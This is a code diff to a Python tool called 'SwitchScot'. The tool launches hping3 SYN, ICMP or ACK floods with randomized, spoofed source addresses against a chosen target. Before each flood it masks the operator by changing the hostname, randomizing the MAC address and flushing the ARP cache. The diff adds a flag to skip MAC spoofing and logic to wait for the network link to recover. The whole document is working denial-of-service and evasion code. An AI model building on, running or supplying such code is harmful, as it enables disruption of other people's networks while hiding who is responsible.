@@ -18,12 +18,13 @@ import time
 from datetime import datetime
 
 class SwitchScot:
-    def __init__(self, target="10.0.0.1", port=80, interface=None, mode="tcp-syn"):
+    def __init__(self, target="10.0.0.1", port=80, interface=None, mode="tcp-syn", skip_mac=False):
         self.target = target
         self.port = port
         self.mode = mode
-        self.interface = interface or self.detect_interface()
+        self.skip_mac = skip_mac
         self.is_termux = self.check_termux()
+        self.interface = interface or self.detect_interface()
         self.attack_process = None
         self.start_time = None
         self.current_mac = "N/A"
@@ -42,7 +43,10 @@ class SwitchScot:
             sys.exit(1)
 
     def check_dependencies(self):
-        required_tools = ["hping3", "macchanger", "ip"]
+        required_tools = ["hping3", "ip"]
+        if not self.skip_mac:
+            required_tools.append("macchanger")
+
         missing = []
         for tool in required_tools:
             if subprocess.run(["which", tool], capture_output=True).returncode != 0:
@@ -66,7 +70,7 @@ class SwitchScot:
         except Exception:
             pass
 
-        # Fallback: scan available interfaces
+        # Fallback: scan available non-loopback interfaces
         try:
             ifaces = [f for f in os.listdir('/sys/class/net') if f != 'lo']
             if ifaces:
@@ -83,6 +87,48 @@ class SwitchScot:
             return match.group(1) if match else "Unknown"
         except Exception:
             return "Unknown"
+
+    def wait_for_carrier_and_route(self, timeout=15):
+        """Waits for wireless/wired link carrier and routing to re-establish."""
+        print(f"[*] Verifying carrier link and route readiness on '{self.interface}'...")
+        start_time = time.time()
+        
+        while time.time() - start_time < timeout:
+            carrier_ok = False
+            carrier_file = f"/sys/class/net/{self.interface}/carrier"
+            operstate_file = f"/sys/class/net/{self.interface}/operstate"
+
+            if os.path.exists(carrier_file):
+                try:
+                    with open(carrier_file, "r") as f:
+                        if f.read().strip() == "1":
+                            carrier_ok = True
+                except Exception:
+                    pass
+            elif os.path.exists(operstate_file):
+                try:
+                    with open(operstate_file, "r") as f:
+                        if f.read().strip() in ["up", "unknown"]:
+                            carrier_ok = True
+                except Exception:
+                    pass
+            else:
+                carrier_ok = True
+
+            if carrier_ok:
+                # Test route to target
+                try:
+                    res = subprocess.run(["ip", "route", "get", self.target], capture_output=True)
+                    if res.returncode == 0:
+                        print(f"[+] Interface '{self.interface}' connected. Route to {self.target} verified.")
+                        return True
+                except Exception:
+                    pass
+
+            time.sleep(1)
+
+        print(f"[!] Notice: Link timeout reached. Proceeding with execution on '{self.interface}'.")
+        return False
 
     def randomize_identity(self):
         print("\n[*] Applying persistent obfuscation layer...")
@@ -101,15 +147,21 @@ class SwitchScot:
         subprocess.run(["hostname", new_host], capture_output=True)
         self.current_hostname = new_host
 
-        # 3. Randomize MAC Address
-        subprocess.run(["ip", "link", "set", self.interface, "down"], capture_output=True)
-        subprocess.run(["macchanger", "-r", self.interface], capture_output=True)
-        subprocess.run(["ip", "link", "set", self.interface, "up"], capture_output=True)
-        self.current_mac = self.get_mac_address()
+        # 3. Randomize MAC Address (if enabled)
+        if not self.skip_mac:
+            print(f"[*] Cycling MAC address on '{self.interface}'...")
+            subprocess.run(["ip", "link", "set", self.interface, "down"], capture_output=True)
+            subprocess.run(["macchanger", "-r", self.interface], capture_output=True)
+            subprocess.run(["ip", "link", "set", self.interface, "up"], capture_output=True)
+            self.current_mac = self.get_mac_address()
+            # Wait for Wi-Fi re-association
+            self.wait_for_carrier_and_route()
+        else:
+            self.current_mac = self.get_mac_address()
+            print(f"[*] Preserving existing MAC address on '{self.interface}' ({self.current_mac}).")
 
         # 4. Flush ARP neighbor cache
         subprocess.run(["ip", "neigh", "flush", "all"], capture_output=True)
-        time.sleep(1.5)
 
     def build_command(self):
         base_cmd = ["hping3", "--flood", "--rand-source"]
@@ -131,13 +183,13 @@ class SwitchScot:
         self.randomize_identity()
 
         cmd = self.build_command()
-        print("=" * 60)
+        print("=" * 65)
         print(f" ⚡ SWITCH-SCOT ENGINE ACTIVE")
         print(f" • Platform  : {'Android (Termux)' if self.is_termux else 'Linux OS'}")
         print(f" • Interface : {self.interface} | MAC: {self.current_mac}")
         print(f" • Hostname  : {self.current_hostname}")
         print(f" • Mode      : {self.mode.upper()} | Target: {self.target}:{self.port if self.mode != 'icmp' else 'ICMP'}")
-        print("=" * 60)
+        print("=" * 65)
         print(" [*] Press Ctrl+C to terminate execution.\n")
 
         self.start_time = datetime.now()
@@ -198,13 +250,19 @@ def main():
              "  icmp     : ICMP Echo Control Plane Latency\n"
              "  tcp-ack  : TCP ACK Stateful Filter Inspection"
     )
+    parser.add_argument(
+        "--no-mac",
+        action="store_true",
+        help="Skip MAC address randomization (Recommended for active Wi-Fi on laptops)"
+    )
 
     args = parser.parse_args()
     engine = SwitchScot(
         target=args.target,
         port=args.port,
         interface=args.interface,
-        mode=args.mode
+        mode=args.mode,
+        skip_mac=args.no_mac
     )
     engine.start()
 
